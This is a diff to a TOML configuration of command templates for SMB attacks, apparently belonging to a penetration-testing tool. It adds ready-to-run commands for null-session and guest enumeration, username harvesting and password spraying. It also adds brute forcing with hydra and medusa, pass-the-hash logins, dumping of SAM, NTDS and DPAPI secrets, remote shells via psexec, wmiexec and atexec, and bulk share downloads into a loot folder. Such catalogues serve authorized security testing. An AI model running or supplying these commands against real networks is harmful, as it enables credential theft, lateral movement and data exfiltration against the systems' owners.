@@ -3,21 +3,478 @@ display_name = "SMB"
 icon = ""
 order = 20
 
+# Placeholders (TUI edit or `chronosphere run … -v key=val`):
+#   share=SHARE_NAME   remote_path=\\path\\to\\file   local_path=./loot
+#   userlist=users.txt   wordlist=/usr/share/wordlists/rockyou.txt
+#
+# smbclient auth quick ref:
+#   guest/null  → -N  or  -U '' -N  or  -U 'guest%'
+#   user+pass   → -U 'DOMAIN\\user%password'  (or {smb_user_spec} from cred profile)
+#   NTLM hash   → -U 'DOMAIN\\user' --pw-nt-hash {nt_hash}
+#   Kerberos    → -k -U 'user@domain'
+
+# === Recon / port scan ===
+
+[[command]]
+id = "smb.nmap.smb_scripts"
+title = "nmap — SMB enum scripts (445)"
+template = "nmap -p 445 -Pn --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "enum"]
+
+[[command]]
+id = "smb.nmap.smb_vuln"
+title = "nmap — SMB vuln scripts"
+template = "nmap -p 445 -Pn --script smb-vuln* {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "vuln"]
+
+[[command]]
+id = "smb.nmap.smb_signing"
+title = "nmap — smb-security-mode (signing)"
+template = "nmap -p 445 -Pn --script smb-security-mode {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "signing"]
+
+[[command]]
+id = "smb.nmap.smb_brute"
+title = "nmap — smb-brute (noisy)"
+template = "nmap -p 445 -Pn --script smb-brute --script-args smbuser=users.txt,smbpass=/usr/share/wordlists/rockyou.txt {target}"
+requires = ["nmap"]
+tags = ["recon", "nmap", "brute", "noisy"]
+
+# === smbclient — authentication ===
+
 [[command]]
 id = "smb.smbclient.list_guest"
-title = "smbclient -L (guest)"
+title = "smbclient -L (guest / no password)"
 template = "smbclient -L //{target} -N"
 requires = ["smbclient"]
-tags = ["enum", "shares", "unauth"]
+tags = ["enum", "shares", "unauth", "guest"]
 when = "creds.kind in ['none','plaintext','ntlm','kerberos']"
 
 [[command]]
+id = "smb.smbclient.list_null"
+title = "smbclient -L (null session)"
+template = "smbclient -L //{target} -U '' -N"
+requires = ["smbclient"]
+tags = ["enum", "shares", "unauth", "null"]
+
+[[command]]
+id = "smb.smbclient.list_guest_explicit"
+title = "smbclient -L (explicit guest user)"
+template = "smbclient -L //{target} -U 'guest%'"
+requires = ["smbclient"]
+tags = ["enum", "shares", "guest"]
+
+[[command]]
 id = "smb.smbclient.list_authed"
-title = "smbclient -L (authenticated)"
+title = "smbclient -L (authenticated — profile creds)"
 template = "smbclient -L //{target} -U '{smb_user_spec}'"
 requires = ["smbclient"]
 tags = ["enum", "shares", "authed"]
 when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.smbclient.list_user_pass"
+title = "smbclient -L (user + password explicit)"
+template = "smbclient -L //{target} -U '{domain_user}%{password}'"
+requires = ["smbclient"]
+tags = ["enum", "shares", "authed"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.smbclient.list_hash"
+title = "smbclient -L (pass-the-hash)"
+template = "smbclient -L //{target} -U '{domain_user}' --pw-nt-hash {nt_hash}"
+requires = ["smbclient"]
+tags = ["enum", "shares", "pth"]
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "smb.smbclient.list_kerberos"
+title = "smbclient -L (Kerberos ticket)"
+template = "smbclient -L //{target} -k -U '{user_at_domain}'"
+requires = ["smbclient"]
+tags = ["enum", "shares", "kerberos"]
+when = "creds.kind == 'kerberos'"
+
+[[command]]
+id = "smb.smbclient.interactive_guest"
+title = "smbclient — interactive shell (guest, share)"
+template = "smbclient //{target}/{share} -N"
+requires = ["smbclient"]
+tags = ["interactive", "guest", "share"]
+interactive = true
+
+[[command]]
+id = "smb.smbclient.interactive_null"
+title = "smbclient — interactive shell (null session)"
+template = "smbclient //{target}/{share} -U '' -N"
+requires = ["smbclient"]
+tags = ["interactive", "null", "share"]
+interactive = true
+
+[[command]]
+id = "smb.smbclient.interactive_authed"
+title = "smbclient — interactive shell (authenticated)"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}'"
+requires = ["smbclient"]
+tags = ["interactive", "authed", "share"]
+interactive = true
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.smbclient.interactive_hash"
+title = "smbclient — interactive shell (pass-the-hash)"
+template = "smbclient //{target}/{share} -U '{domain_user}' --pw-nt-hash {nt_hash}"
+requires = ["smbclient"]
+tags = ["interactive", "pth", "share"]
+interactive = true
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "smb.smbclient.interactive_kerberos"
+title = "smbclient — interactive shell (Kerberos)"
+template = "smbclient //{target}/{share} -k -U '{user_at_domain}'"
+requires = ["smbclient"]
+tags = ["interactive", "kerberos", "share"]
+interactive = true
+when = "creds.kind == 'kerberos'"
+
+# === smbclient — list & download ===
+
+[[command]]
+id = "smb.smbclient.ls_guest"
+title = "smbclient — list share root (guest)"
+template = "smbclient //{target}/{share} -N -c 'ls'"
+requires = ["smbclient"]
+tags = ["enum", "guest", "share"]
+
+[[command]]
+id = "smb.smbclient.ls_authed"
+title = "smbclient — list share root (authenticated)"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}' -c 'ls'"
+requires = ["smbclient"]
+tags = ["enum", "authed", "share"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.smbclient.recurse_list"
+title = "smbclient — recursive dir listing (prompt recurse)"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}' -c 'recurse; ls'"
+requires = ["smbclient"]
+tags = ["enum", "share", "recursive"]
+when = "creds.kind in ['plaintext','ntlm','none']"
+
+[[command]]
+id = "smb.smbclient.get_file"
+title = "smbclient — download single file"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}' -D {local_path} -c 'get {remote_path}'"
+requires = ["smbclient"]
+tags = ["download", "share"]
+when = "creds.kind in ['plaintext','ntlm','none']"
+
+[[command]]
+id = "smb.smbclient.mget_recursive"
+title = "smbclient — recursive download (mget *)"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}' -D {local_path} -c 'prompt OFF; recurse; mget *'"
+requires = ["smbclient"]
+tags = ["download", "share", "recursive"]
+when = "creds.kind in ['plaintext','ntlm','none']"
+
+[[command]]
+id = "smb.smbclient.tar_download"
+title = "smbclient — tar mode bulk download"
+template = "smbclient //{target}/{share} -U '{smb_user_spec}' -Tc {local_path} {remote_path}"
+requires = ["smbclient"]
+tags = ["download", "share", "bulk"]
+when = "creds.kind in ['plaintext','ntlm','none']"
+
+[[command]]
+id = "smb.smbclient.mount_cifs"
+title = "mount.cifs — mount readable share locally"
+template = "sudo mkdir -p /mnt/{share} && sudo mount -t cifs //{target}/{share} /mnt/{share} -o username={user},password='{password}',domain={domain},vers=3.0"
+requires = ["mount"]
+tags = ["mount", "download", "share"]
+when = "creds.kind == 'plaintext'"
+
+# === smbmap ===
+
+[[command]]
+id = "smb.smbmap.guest"
+title = "smbmap — share permissions (guest)"
+template = "smbmap -H {target} -u 'guest' -p ''"
+requires = ["smbmap"]
+tags = ["enum", "shares", "guest"]
+
+[[command]]
+id = "smb.smbmap.null"
+title = "smbmap — share permissions (null session)"
+template = "smbmap -H {target} -u '' -p ''"
+requires = ["smbmap"]
+tags = ["enum", "shares", "null"]
+
+[[command]]
+id = "smb.smbmap.shares"
+title = "smbmap — share permissions (authenticated)"
+template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}'"
+requires = ["smbmap"]
+tags = ["enum", "shares", "authed"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.smbmap.recursive"
+title = "smbmap — recursive listing (-R)"
+template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' -R {share}"
+requires = ["smbmap"]
+tags = ["enum", "share", "recursive"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.smbmap.download"
+title = "smbmap — download file from share"
+template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' --download {remote_path} -s {share}"
+requires = ["smbmap"]
+tags = ["download", "share"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.smbmap.download_dir"
+title = "smbmap — download directory (-A)"
+template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}' -A {share} -r {remote_path}"
+requires = ["smbmap"]
+tags = ["download", "share", "recursive"]
+when = "creds.kind == 'plaintext'"
+
+# === enum4linux-ng ===
+
+[[command]]
+id = "smb.enum4linux"
+title = "enum4linux-ng — full audit (-A)"
+template = "enum4linux-ng -A {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "legacy"]
+
+[[command]]
+id = "smb.enum4linux.users"
+title = "enum4linux-ng — users only (-U)"
+template = "enum4linux-ng -U {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "users"]
+
+[[command]]
+id = "smb.enum4linux.shares"
+title = "enum4linux-ng — shares only (-S)"
+template = "enum4linux-ng -S {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "shares"]
+
+[[command]]
+id = "smb.enum4linux.policy"
+title = "enum4linux-ng — password policy (-P)"
+template = "enum4linux-ng -P {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "pass-pol"]
+
+[[command]]
+id = "smb.enum4linux.groups"
+title = "enum4linux-ng — groups (-G)"
+template = "enum4linux-ng -G {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "groups"]
+
+[[command]]
+id = "smb.enum4linux.authed"
+title = "enum4linux-ng — full audit (authenticated)"
+template = "enum4linux-ng -A -u '{user}' -p '{password}' -d '{domain}' {target}"
+requires = ["enum4linux-ng"]
+tags = ["enum", "authed"]
+when = "creds.kind == 'plaintext'"
+
+# === rpcclient ===
+
+[[command]]
+id = "smb.rpcclient.unauth"
+title = "rpcclient — enum users/groups/info (null session)"
+template = "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "unauth"]
+
+[[command]]
+id = "smb.rpcclient.authed"
+title = "rpcclient — enum users/groups/info (authenticated)"
+template = "rpcclient -U '{user}%{password}' {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "authed"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.rpcclient.srvinfo"
+title = "rpcclient — srvinfo + netshareenum"
+template = "rpcclient -U '{smb_user_spec}' {target} -c 'srvinfo;netshareenumall'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "shares"]
+
+[[command]]
+id = "smb.rpcclient.lookupnames"
+title = "rpcclient — lookupnames (SID → name)"
+template = "rpcclient -U '{smb_user_spec}' {target} -c 'lookupnames S-1-5-21-0-0-0-500'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "rid"]
+
+[[command]]
+id = "smb.rpcclient.getdompwinfo"
+title = "rpcclient — getdompwinfo (password policy)"
+template = "rpcclient -U '{smb_user_spec}' {target} -c 'getdompwinfo'"
+requires = ["rpcclient"]
+tags = ["enum", "rpc", "pass-pol"]
+
+# === Username harvesting (organized output) ===
+
+[[command]]
+id = "smb.harvest.rpcclient_users"
+title = "rpcclient → users.txt (parsed sAMAccountNames)"
+template = """rpcclient -U '{smb_user_spec}' {target} -c 'enumdomusers' 2>/dev/null \\
+ | grep 'user:' | awk -F'[][]' '{print $2}' | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["rpcclient"]
+tags = ["harvest", "users", "output"]
+
+[[command]]
+id = "smb.harvest.nxc_users"
+title = "nxc smb --users → users.txt"
+template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
+ | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["nxc"]
+tags = ["harvest", "users", "output", "nxc"]
+
+[[command]]
+id = "smb.harvest.nxc_ridbrute_users"
+title = "nxc smb --rid-brute → users.txt"
+template = """nxc smb {target} {nxc_auth} --rid-brute 2>/dev/null \\
+ | awk '/SidTypeUser/ {print $NF}' | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["nxc"]
+tags = ["harvest", "users", "output", "nxc", "rid"]
+
+[[command]]
+id = "smb.harvest.lookupsid_users"
+title = "impacket-lookupsid → users.txt"
+template = """impacket-lookupsid '{user_at_domain}:{password}@{target}' 20000 2>/dev/null \\
+ | grep 'SidTypeUser' | awk '{print $2}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["impacket-lookupsid"]
+tags = ["harvest", "users", "output", "rid"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.harvest.lookupsid_null"
+title = "impacket-lookupsid (null) → users.txt"
+template = """impacket-lookupsid {target}/anonymous@{target} 20000 2>/dev/null \\
+ | grep 'SidTypeUser' | awk '{print $2}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["impacket-lookupsid"]
+tags = ["harvest", "users", "output", "rid", "unauth"]
+
+[[command]]
+id = "smb.harvest.enum4linux_users"
+title = "enum4linux-ng JSON → users.txt"
+template = """enum4linux-ng -U {target} -oJ /tmp/e4l_{target} \\
+ && jq -r '.users[].username // empty' /tmp/e4l_{target}/*.json 2>/dev/null | sort -u > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["enum4linux-ng", "jq"]
+tags = ["harvest", "users", "output"]
+
+[[command]]
+id = "smb.harvest.combined"
+title = "Multi-source user harvest → users.txt"
+template = """mkdir -p loot && : > loot/all_users.txt \\
+ && (rpcclient -U '{smb_user_spec}' {target} -c 'enumdomusers' 2>/dev/null | grep 'user:' | awk -F'[][]' '{print $2}') >> loot/all_users.txt \\
+ && (nxc smb {target} {nxc_auth} --users 2>/dev/null | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2) >> loot/all_users.txt \\
+ && (nxc smb {target} {nxc_auth} --rid-brute 2>/dev/null | awk '/SidTypeUser/ {print $NF}') >> loot/all_users.txt \\
+ && sort -u loot/all_users.txt > {userlist} \\
+ && wc -l {userlist} && head {userlist}"""
+requires = ["rpcclient", "nxc"]
+tags = ["harvest", "users", "output", "chain"]
+
+# === NetExec (nxc) — auth & fingerprint ===
+
+[[command]]
+id = "smb.nxc.host_id"
+title = "nxc smb — fingerprint host"
+template = "nxc smb {target} {nxc_auth}"
+requires = ["nxc"]
+tags = ["enum", "nxc", "auth"]
+
+[[command]]
+id = "smb.nxc.local_auth"
+title = "nxc smb — local auth (--local-auth)"
+template = "nxc smb {target} -u '{user}' -p '{password}' --local-auth"
+requires = ["nxc"]
+tags = ["enum", "nxc", "local-auth"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.nxc.hash"
+title = "nxc smb — pass-the-hash"
+template = "nxc smb {target} -u '{user}' -H '{nt_hash}' -d {domain}"
+requires = ["nxc"]
+tags = ["enum", "nxc", "pth"]
+when = "creds.kind == 'ntlm'"
+
+[[command]]
+id = "smb.nxc.kerberos"
+title = "nxc smb — Kerberos (--use-kcache)"
+template = "nxc smb {target} --use-kcache"
+requires = ["nxc"]
+tags = ["enum", "nxc", "kerberos"]
+when = "creds.kind == 'kerberos'"
+
+# === NetExec (nxc) — enumeration ===
+
+[[command]]
+id = "smb.nxc.shares"
+title = "nxc smb — shares only"
+template = "nxc smb {target} {nxc_auth} --shares"
+requires = ["nxc"]
+tags = ["enum", "nxc", "shares"]
+
+[[command]]
+id = "smb.nxc.users"
+title = "nxc smb — domain users"
+template = "nxc smb {target} {nxc_auth} --users"
+requires = ["nxc"]
+tags = ["enum", "nxc", "users"]
+
+[[command]]
+id = "smb.nxc.groups"
+title = "nxc smb — domain groups"
+template = "nxc smb {target} {nxc_auth} --groups"
+requires = ["nxc"]
+tags = ["enum", "nxc", "groups"]
+
+[[command]]
+id = "smb.nxc.local_groups"
+title = "nxc smb — local groups"
+template = "nxc smb {target} {nxc_auth} --local-groups"
+requires = ["nxc"]
+tags = ["enum", "nxc", "groups"]
+
+[[command]]
+id = "smb.nxc.pass_pol"
+title = "nxc smb — password policy"
+template = "nxc smb {target} {nxc_auth} --pass-pol"
+requires = ["nxc"]
+tags = ["enum", "nxc", "pass-pol"]
+
+[[command]]
+id = "smb.nxc.rid_brute"
+title = "nxc smb — RID brute"
+template = "nxc smb {target} {nxc_auth} --rid-brute"
+requires = ["nxc"]
+tags = ["enum", "nxc", "rid"]
 
 [[command]]
 id = "smb.nxc.bulk_enum"
@@ -27,20 +484,6 @@ requires = ["nxc"]
 tags = ["enum", "nxc", "noisy"]
 
 [[command]]
-id = "smb.nxc.host_id"
-title = "nxc smb — fingerprint host"
-template = "nxc smb {target} {nxc_auth}"
-requires = ["nxc"]
-tags = ["enum", "nxc"]
-
-[[command]]
-id = "smb.nxc.spider"
-title = "nxc smb — spider plus (recursive share dump)"
-template = "nxc smb {target} {nxc_auth} -M spider_plus -o EXCLUDE_FILTER='print$,IPC$' DOWNLOAD_FLAG=False"
-requires = ["nxc"]
-tags = ["enum", "nxc", "spider"]
-
-[[command]]
 id = "smb.nxc.loggedon"
 title = "nxc smb — loggedon-users + sessions"
 template = "nxc smb {target} {nxc_auth} --loggedon-users --sessions"
@@ -48,33 +491,94 @@ requires = ["nxc"]
 tags = ["enum", "nxc"]
 
 [[command]]
+id = "smb.nxc.disks"
+title = "nxc smb — disk info"
+template = "nxc smb {target} {nxc_auth} --disks"
+requires = ["nxc"]
+tags = ["enum", "nxc"]
+
+[[command]]
+id = "smb.nxc.signing"
+title = "nxc smb — check signing + gen relay list"
+template = "nxc smb {target} --gen-relay-list relay_targets.txt && cat relay_targets.txt"
+requires = ["nxc"]
+tags = ["enum", "nxc", "signing", "relay"]
+
+[[command]]
+id = "smb.nxc.null_shares"
+title = "nxc smb — null session share enum"
+template = "nxc smb {target} -u '' -p '' --shares"
+requires = ["nxc"]
+tags = ["enum", "nxc", "null", "shares"]
+
+[[command]]
+id = "smb.nxc.guest_shares"
+title = "nxc smb — guest share enum"
+template = "nxc smb {target} -u 'guest' -p '' --shares"
+requires = ["nxc"]
+tags = ["enum", "nxc", "guest", "shares"]
+
+# === NetExec — spider / download / upload ===
+
+[[command]]
+id = "smb.nxc.spider"
+title = "nxc smb — spider_plus (list only, no download)"
+template = "nxc smb {target} {nxc_auth} -M spider_plus -o EXCLUDE_FILTER='print$,IPC$' DOWNLOAD_FLAG=False"
+requires = ["nxc"]
+tags = ["enum", "nxc", "spider"]
+
+[[command]]
+id = "smb.nxc.spider_download"
+title = "nxc smb — spider_plus (download readable files)"
+template = "nxc smb {target} {nxc_auth} -M spider_plus -o EXCLUDE_FILTER='print$,IPC$' DOWNLOAD_FLAG=True"
+requires = ["nxc"]
+tags = ["enum", "nxc", "spider", "download"]
+
+[[command]]
+id = "smb.nxc.put_file"
+title = "nxc smb — upload file to share (--put-file)"
+template = "nxc smb {target} {nxc_auth} --put-file {local_path} '\\\\{share}\\\\{remote_path}'"
+requires = ["nxc"]
+tags = ["upload", "nxc", "share"]
+
+[[command]]
+id = "smb.nxc.get_file"
+title = "nxc smb — download file from share (--get-file)"
+template = "nxc smb {target} {nxc_auth} --get-file '\\\\{share}\\\\{remote_path}' {local_path}"
+requires = ["nxc"]
+tags = ["download", "nxc", "share"]
+
+# === Password spray / brute ===
+
+[[command]]
 id = "smb.nxc.password_spray"
 title = "nxc smb — password spray (user file vs single pass)"
-template = "nxc smb {target} -u /opt/wordlists/users.txt -p 'Spring2025!' --continue-on-success"
+template = "nxc smb {target} -u {userlist} -p 'Spring2025!' --continue-on-success"
 requires = ["nxc"]
 tags = ["spray", "nxc", "noisy"]
 
 [[command]]
-id = "smb.enum4linux"
-title = "enum4linux-ng -A"
-template = "enum4linux-ng -A {target}"
-requires = ["enum4linux-ng"]
-tags = ["enum", "legacy"]
+id = "smb.nxc.password_spray_jitter"
+title = "nxc smb — password spray with jitter"
+template = "nxc smb {target} -u {userlist} -p 'Spring2025!' --jitter 5 --continue-on-success"
+requires = ["nxc"]
+tags = ["spray", "nxc", "noisy"]
 
 [[command]]
-id = "smb.rpcclient.unauth"
-title = "rpcclient enumdomusers (null session)"
-template = "rpcclient -U '' -N {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
-requires = ["rpcclient"]
-tags = ["enum", "rpc", "unauth"]
+id = "smb.hydra.smb"
+title = "hydra — SMB brute (445)"
+template = "hydra -L {userlist} -P {wordlist} smb://{target} -t 4"
+requires = ["hydra"]
+tags = ["brute", "noisy"]
 
 [[command]]
-id = "smb.rpcclient.authed"
-title = "rpcclient enumdomusers (authenticated)"
-template = "rpcclient -U '{user}%{password}' {target} -c 'enumdomusers;enumdomgroups;querydominfo'"
-requires = ["rpcclient"]
-tags = ["enum", "rpc", "authed"]
-when = "creds.kind == 'plaintext'"
+id = "smb.medusa.smb"
+title = "medusa — SMB brute"
+template = "medusa -h {target} -U {userlist} -P {wordlist} -M smbnt"
+requires = ["medusa"]
+tags = ["brute", "noisy"]
+
+# === Credential dumps ===
 
 [[command]]
 id = "smb.nxc.sam_dump"
@@ -101,17 +605,35 @@ tags = ["dump", "ntds", "dcsync"]
 when = "creds.kind in ['plaintext','ntlm']"
 
 [[command]]
-id = "smb.smbmap.shares"
-title = "smbmap (share permissions)"
-template = "smbmap -H {target} -u '{user}' -p '{password}' -d '{domain}'"
-requires = ["smbmap"]
-tags = ["enum", "shares"]
+id = "smb.nxc.dpapi"
+title = "nxc smb — DPAPI secrets"
+template = "nxc smb {target} {nxc_auth} --dpapi"
+requires = ["nxc"]
+tags = ["dump", "dpapi"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.impacket.secretsdump"
+title = "impacket-secretsdump — SAM/LSA/NTDS"
+template = "impacket-secretsdump '{user_at_domain}:{password}@{target}'"
+requires = ["impacket-secretsdump"]
+tags = ["dump", "secretsdump"]
 when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.impacket.secretsdump_hash"
+title = "impacket-secretsdump — pass-the-hash"
+template = "impacket-secretsdump -hashes ':{nt_hash}' '{user_at_domain}@{target}'"
+requires = ["impacket-secretsdump"]
+tags = ["dump", "secretsdump", "pth"]
+when = "creds.kind == 'ntlm'"
+
+# === Remote exec ===
 
 [[command]]
 id = "smb.impacket.smbexec"
 title = "impacket-smbexec (semi-interactive)"
-template = "impacket-smbexec '{user_at_domain}':'{password}'@{target}"
+template = "impacket-smbexec '{user_at_domain}:{password}@{target}'"
 requires = ["impacket-smbexec"]
 tags = ["exec", "shell", "interactive"]
 interactive = true
@@ -120,7 +642,7 @@ when = "creds.kind == 'plaintext'"
 [[command]]
 id = "smb.impacket.psexec"
 title = "impacket-psexec (SYSTEM shell)"
-template = "impacket-psexec '{user_at_domain}':'{password}'@{target}"
+template = "impacket-psexec '{user_at_domain}:{password}@{target}'"
 requires = ["impacket-psexec"]
 tags = ["exec", "shell", "interactive", "noisy"]
 interactive = true
@@ -129,7 +651,7 @@ when = "creds.kind == 'plaintext'"
 [[command]]
 id = "smb.impacket.wmiexec"
 title = "impacket-wmiexec (stealthier)"
-template = "impacket-wmiexec '{user_at_domain}':'{password}'@{target}"
+template = "impacket-wmiexec '{user_at_domain}:{password}@{target}'"
 requires = ["impacket-wmiexec"]
 tags = ["exec", "shell", "interactive"]
 interactive = true
@@ -138,7 +660,52 @@ when = "creds.kind == 'plaintext'"
 [[command]]
 id = "smb.impacket.atexec"
 title = "impacket-atexec (Scheduled-task exec)"
-template = "impacket-atexec '{user_at_domain}':'{password}'@{target} 'whoami /all'"
+template = "impacket-atexec '{user_at_domain}:{password}@{target}' 'whoami /all'"
 requires = ["impacket-atexec"]
 tags = ["exec"]
 when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "smb.nxc.exec_whoami"
+title = "nxc smb — exec whoami /all (-x)"
+template = "nxc smb {target} {nxc_auth} -x 'whoami /all'"
+requires = ["nxc"]
+tags = ["exec", "nxc"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+[[command]]
+id = "smb.nxc.powershell"
+title = "nxc smb — PowerShell one-liner (-X)"
+template = "nxc smb {target} {nxc_auth} -X 'Get-LocalUser | Select-Object Name,Enabled,LastLogon'"
+requires = ["nxc"]
+tags = ["exec", "nxc"]
+when = "creds.kind in ['plaintext','ntlm']"
+
+# === Chained workflows ===
+
+[[command]]
+id = "smb.chain.enum_to_spray"
+title = "Harvest users → password spray"
+template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
+ | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ && nxc smb {target} -u {userlist} -p 'Spring2025!' --continue-on-success"""
+requires = ["nxc"]
+tags = ["chain", "spray", "harvest"]
+
+[[command]]
+id = "smb.chain.guest_enum_download"
+title = "Guest share enum → recursive smbclient download"
+template = """smbclient -L //{target} -N \\
+ && smbclient //{target}/{share} -N -D {local_path} -c 'prompt OFF; recurse; mget *'"""
+requires = ["smbclient"]
+tags = ["chain", "guest", "download"]
+
+[[command]]
+id = "smb.chain.authed_spider_spray"
+title = "Spider shares → harvest users → spray"
+template = """nxc smb {target} {nxc_auth} -M spider_plus -o DOWNLOAD_FLAG=False \\
+ && nxc smb {target} {nxc_auth} --users --rid-brute \\
+ | awk '/SidTypeUser/ {print $NF} /\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ && nxc smb {target} -u {userlist} -p 'Spring2025!' --jitter 3 --continue-on-success"""
+requires = ["nxc"]
+tags = ["chain", "spider", "spray", "harvest"]
